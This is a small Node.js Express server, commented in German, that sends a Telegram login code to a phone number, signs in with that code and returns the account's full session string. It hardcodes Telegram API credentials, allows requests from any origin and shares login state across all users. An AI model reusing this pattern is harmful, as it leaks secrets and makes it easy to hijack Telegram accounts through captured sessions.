const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// Deine Daten
const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';

// Client global initialisieren
let client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
let phoneCodeHash = '';

// Route: OTP senden
app.post('/send-otp', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        if (!client.connected) await client.connect();
        
        const result = await client.sendCode({ apiId, apiHash }, phoneNumber);
        phoneCodeHash = result.phoneCodeHash;
        
        res.json({ success: true });
    } catch (error) {
        console.error("Error sending OTP:", error);
        res.status(400).json({ error: error.message });
    }
});

// Route: OTP verifizieren
app.post('/verify-otp', async (req, res) => {
    try {
        const { phoneNumber, code } = req.body;
        
        // Wichtig: In neuen gram.js Versionen heißt es client.signIn
        const user = await client.signIn({
            apiId,
            apiHash,
            phoneNumber: phoneNumber,
            phoneCodeHash: phoneCodeHash,
            phoneCode: code
        });
        
        const sessionString = client.session.save();
        res.json({ success: true, session: sessionString });
    } catch (error) {
        console.error("Error verifying OTP:", error);
        res.status(400).json({ error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server läuft auf ${PORT}`));
